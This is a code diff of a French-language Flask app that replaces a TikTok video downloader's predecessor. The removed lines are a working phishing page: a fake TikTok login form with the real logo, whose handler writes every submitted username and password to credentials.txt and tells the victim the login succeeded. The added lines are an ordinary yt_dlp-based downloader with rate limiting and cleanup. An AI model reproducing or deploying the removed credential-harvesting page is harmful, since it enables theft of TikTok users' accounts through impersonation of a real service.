@@ -1,139 +1,119 @@
-from flask import Flask, request, render_template_string
+import os
+import re
+import time
+import threading
+import tempfile
+import logging
+from flask import Flask, request, jsonify, send_file
+from flask_cors import CORS
+from flask_limiter import Limiter
+from flask_limiter.util import get_remote_address
+import yt_dlp
 
+# ------------------- Configuration -------------------
 app = Flask(__name__)
+CORS(app)
 
-# Votre code HTML ici
-HTML_TEMPLATE = '''
-<!DOCTYPE html>
-<html lang="fr">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Connexion TikTok</title>
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
-    <style>
-        body {
-            margin: 0;
-            font-family: 'Roboto', sans-serif;
-            background: #f9f9f9;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-        }
+# Logs
+logging.basicConfig(level=logging.INFO)
 
-        .login-container {
-            background: #fff;
-            padding: 40px;
-            border-radius: 12px;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
-            width: 350px;
-            text-align: center;
-        }
+# Rate limit global
+limiter = Limiter(
+    get_remote_address,
+    app=app,
+    default_limits=["20 per minute"]
+)
 
-        .login-container img {
-            width: 100px;
-            margin-bottom: 20px;
-        }
+# Temp folder pour les vidéos
+TEMP_FOLDER = tempfile.gettempdir()
 
-        h2 {
-            margin-bottom: 30px;
-            font-weight: 500;
-        }
+# Nettoyage automatique
+def cleanup_temp():
+    while True:
+        now = time.time()
+        for f in os.listdir(TEMP_FOLDER):
+            if f.startswith("tiktok_"):
+                path = os.path.join(TEMP_FOLDER, f)
+                try:
+                    if now - os.path.getmtime(path) > 600:  # 10 min
+                        os.remove(path)
+                        logging.info(f"Supprimé {path}")
+                except Exception as e:
+                    logging.error(f"Erreur nettoyage: {e}")
+        time.sleep(300)  # toutes les 5 min
 
-        input[type="text"], input[type="password"] {
-            width: 100%;
-            padding: 12px 15px;
-            margin-bottom: 15px;
-            border: 1px solid #ddd;
-            border-radius: 8px;
-            font-size: 14px;
-        }
+threading.Thread(target=cleanup_temp, daemon=True).start()
 
-        button {
-            width: 100%;
-            padding: 12px;
-            background: linear-gradient(90deg, #fe2c55, #ff5e62);
-            border: none;
-            border-radius: 8px;
-            color: #fff;
-            font-weight: 500;
-            cursor: pointer;
-            transition: 0.3s;
-        }
+# ------------------- Fonctions -------------------
+def validate_url(url):
+    """Validation stricte TikTok"""
+    if not url:
+        return "URL manquante"
+    if len(url) > 300:
+        return "URL trop longue"
+    
+    pattern = r'https?://(www\.|vm\.)?tiktok\.com/.+'
+    if not re.match(pattern, url):
+        return "Lien TikTok invalide"
+    return None
 
-        button:hover {
-            opacity: 0.9;
-        }
+def download_tiktok(url):
+    """Télécharge la vidéo et retourne le chemin"""
+    filename = f"tiktok_{int(time.time())}.mp4"
+    filepath = os.path.join(TEMP_FOLDER, filename)
 
-        .links {
-            margin-top: 15px;
-            font-size: 14px;
-        }
+    ydl_opts = {
+        "format": "bestvideo+bestaudio/best",
+        "merge_output_format": "mp4",
+        "outtmpl": filepath,
+        "noplaylist": True,
+        "quiet": True,
+        "retries": 3,  # tente 3 fois si échec
+        "ignoreerrors": True
+    }
 
-        .links a {
-            color: #fe2c55;
-            text-decoration: none;
-        }
+    with yt_dlp.YoutubeDL(ydl_opts) as ydl:
+        info = ydl.extract_info(url, download=True)
+    
+    if not os.path.exists(filepath):
+        raise Exception("Téléchargement échoué")
+    
+    return filepath
 
-        .divider {
-            margin: 20px 0;
-            display: flex;
-            align-items: center;
-            text-align: center;
-            font-size: 12px;
-            color: #999;
-        }
+# ------------------- Routes -------------------
+@app.route("/")
+def health():
+    return jsonify({"status": "online"}), 200
 
-        .divider::before, .divider::after {
-            content: '';
-            flex: 1;
-            height: 1px;
-            background: #ddd;
-        }
+@app.route("/download", methods=["POST"])
+@limiter.limit("10 per minute")
+def download():
+    data = request.get_json()
+    if not data or "url" not in data:
+        return jsonify({"error": "URL manquante"}), 400
 
-        .divider:not(:empty)::before {
-            margin-right: .5em;
-        }
+    url = data["url"].strip()
+    error = validate_url(url)
+    if error:
+        return jsonify({"error": error}), 400
 
-        .divider:not(:empty)::after {
-            margin-left: .5em;
-        }
-    </style>
-</head>
-<body>
-    <div class="login-container">
-        <img src="https://upload.wikimedia.org/wikipedia/fr/0/09/TikTok_logo.png" alt="TikTok Logo">
-        <h2>Connexion</h2>
-        <form action="/" method="post">
-            <input type="text" name="username" placeholder="Numéro de téléphone, email ou nom d'utilisateur" required>
-            <input type="password" name="password" placeholder="Mot de passe" required>
-            <button type="submit">Se connecter</button>
-        </form>
+    try:
+        # Téléchargement
+        filepath = download_tiktok(url)
 
-        <div class="links">
-            <a href="#">Mot de passe oublié ?</a>
-        </div>
+        # Envoi au client
+        return send_file(
+            filepath,
+            mimetype="video/mp4",
+            as_attachment=True,
+            download_name="tiktok_video.mp4"
+        )
+    except Exception as e:
+        logging.error(f"Téléchargement échoué: {e}")
+        return jsonify({"error": "Erreur lors du téléchargement"}), 500
 
-        <div class="divider">ou</div>
-
-        <div class="links">
-            Vous n'avez pas de compte ? <a href="#">S'inscrire</a>
-        </div>
-    </div>
-</body>
-</html>
-'''
-
-@app.route('/', methods=['GET', 'POST'])
-def login():
-    if request.method == 'POST':
-        username = request.form['username']
-        password = request.form['password']
-        with open('credentials.txt', 'a') as f:
-            f.write(f'Username: {username}, Password: {password}\n')
-        return 'Login successful!'
-    return render_template_string(HTML_TEMPLATE)
-
-if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=80)
+# ------------------- Exécution -------------------
+if __name__ == "__main__":
+    port = int(os.environ.get("PORT", 5000))
+    logging.info(f"Serveur démarré sur le port {port}")
+    app.run(host="0.0.0.0", port=port)
